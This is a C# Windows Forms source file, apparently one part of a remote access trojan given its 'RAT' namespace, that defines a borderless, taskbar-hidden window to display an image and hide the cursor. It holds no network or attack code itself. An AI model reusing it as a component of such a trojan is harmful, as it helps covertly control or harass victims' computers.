using System;
using System.Drawing;
using System.Windows.Forms;

namespace RAT
{
    public class ImageForm : Form
    {
        private PictureBox pictureBoxTX;

        public ImageForm()
        {
            InitializeComponent();
        }

        public void SetImage(Image pic)
        {
            pictureBoxTX.Image = pic;
            Show();
            Refresh();
        }

        private void ImageForm_MouseEnter(object sender, EventArgs e)
        {
            Cursor.Hide();
        }

        private void PictureBoxTX_MouseEnter(object sender, EventArgs e)
        {
            Cursor.Hide();
        }

        private void InitializeComponent()
        {
            this.pictureBoxTX = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxTX)).BeginInit();
            this.SuspendLayout();
            // 
            // pictureBoxTX
            // 
            this.pictureBoxTX.BackColor = System.Drawing.Color.Gray;
            this.pictureBoxTX.Dock = System.Windows.Forms.DockStyle.Fill;
            this.pictureBoxTX.Location = new System.Drawing.Point(0, 0);
            this.pictureBoxTX.Margin = new System.Windows.Forms.Padding(0);
            this.pictureBoxTX.Name = "pictureBoxTX";
            this.pictureBoxTX.Size = new System.Drawing.Size(300, 300);
            this.pictureBoxTX.TabIndex = 0;
            this.pictureBoxTX.TabStop = false;
            this.pictureBoxTX.MouseEnter += new System.EventHandler(this.PictureBoxTX_MouseEnter);
            // 
            // ImageForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(300, 300);
            this.ControlBox = false;
            this.Controls.Add(this.pictureBoxTX);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "ImageForm";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "ImageForm";
            this.MouseEnter += new System.EventHandler(this.ImageForm_MouseEnter);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxTX)).EndInit();
            this.ResumeLayout(false);

        }
    }
}
